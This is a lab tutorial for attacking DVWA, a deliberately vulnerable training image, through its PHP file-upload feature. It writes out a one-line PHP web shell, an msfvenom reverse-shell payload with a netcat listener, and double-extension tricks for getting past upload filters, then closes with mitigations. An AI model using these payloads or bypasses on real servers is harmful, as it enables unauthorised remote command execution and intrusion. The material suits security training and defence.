PHP Reverse shell
#####################

Date: 2025-02-01 08:11:21

Status: released version 0.1

Tags: :ref:`Labs` 

Introduction
***************

One would think that modern installations have secured their implementation, however since this tasks 
is left up to humans, we find many installations that have not been updated, and or secured.

This lab series documents approaches for various technologies.  Today, we are targeting an unsecured PHP
installation.

Setup
*********
For the target I am using a docker image from: https://github.com/opsxcq/docker-vulnerable-dvwa
It is an image with the intent of helping students learn about securing web installations.

.. code-block:: bash

    docker run --rm -it -p 80:80 vulnerables/web-dvwa

- Login to the site with http://your_docker_IP with the credentials `admin/password`    
- Click the bottom button (create/reset) to finish the installation
- Login again with the above credentials

How this vulnerability is leveraged is by a server that allows the system command to be used in PHP.  Modern versions have 
this disabled by default, by older installations, or installations that require this command to be 
available may have this set to on.

From `/etc/php.ini` 

.. code-block:: console

    disable_functions =exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

By removing the system function from this comma delimited list, you will enable the system command after the
next service restart.  This tutorial will focus on the system command, but as you can see there are many options.


Create a payload
*******************

We are going to create a payload (a file) to upload the server and see if we can run system commands.

.. code-block:: console

    mkdir -P ~/labs/shells
    cd ~/labs/shells
    echo '<?php system($_REQUEST['cmd']); ?>' > shell.php

- Upload the shell by using the left menu and choosing `File Upload` and upload your created script.
- The created file gets stored on the target in /hackable/uploads 
  
Navigate to the url: http://172.17.0.2/hackable/uploads/shell.php?cmd=whoami and you should see
`www-data`.  This is the output of the command whoami.

.. note:: the cmd is the GET variable name you use as the request in your script, and the argument is 
    whoami, you can also use other system commands such as ls or cat as examples. 

Using MSFVenom to create a more complex payload
**************************************************

- Prerequisite is to have metasploit installed. 
- Substitute your IP with the <HOST_IP> tag 

**Step 1** Create a reverse shell with metasploit 

.. code-block:: console 

    msfvenom -p php/reverse_php LHOST=<HOST_IP> LPORT=1234 -f raw > reverse.php

- Upload the shell by using the left menu and choosing `File Upload` and upload your created script.
- The created file gets stored on the target in /hackable/uploads 

**Step 2** Create a listener on your host machine with netcat 

.. code-block:: console

    nc -lnvp 1234

- Execute the remote reverse shell by requesting the script : http://<HOST_IP>/hackable/uploads/reverse.php
- You should see a connection on your `nc -lnvp 1234` output.  From here you can browse the targets file system.

Dealing with upload filters
*****************************

Applications may be configured to filter file types that can contain malicious content such as shell code.

Blacklist filters
=====================

These type of filters disallow certain types of uploads such as `.sh` `.exe` to help protect the application.  Blacklist filters are common to applications that require a larger expected types of files (such as a file manager)

Whitelist filters
===================

These type of filters are common on Web applications, since the upload feature may focus on a simple usecase such as uploading a picture.  So the filter may online except `.png|.jpg|.jpeg` etc.

Bypassing filters 
===================

Client side Java script 
--------------------------

Changing the client code that executes in your browser.  For example: removing a the `CheckFileExtension` Javascript function that inspects the file extension.  This can be trivial to do, since you can right click on the 
button and choose `inspect element` in Chrome and just highlighting the function and deleting it. 

.. code-block:: console

    <button type="submit" onClick="CheckFileExtension" >Upload</button>

Server side filters
---------------------

A weak filter may allow you to trick the system into believing you are uploading a file it expects, with malicious content. Now you cannot just rename your file to the expected extension, since the system will
treat it as such and not actually execute the code.

Giving this function to filter unwanted files:

.. code-block:: php

    $fileName = basename($_FILES["uploadFile"]["name"]);

    if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
        echo "Only jpg|jpeg|png|gif are allowed";
        die();

The function checks that only image type extensions are uploaded.  The regex above is considered weak, since adding a double extension (ie: `webshell.png.php`) allows a webshell to be uploaded and executed.


Mitigate this Attack Vector
*****************************

The most effective way to protect against this type of attack:

- Adding system style commands to the disable_function list
- Restricting uploads when not necessary 
- Checking file uploads for malicious content with strong testing techniques
- Allowing only approved file extensions from being processed. 
- Using a WAF 
  
References
**************

- PHP System commands: https://www.php.net/manual/en/function.system.php
- How to disable commands: https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/
- Alternate shells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet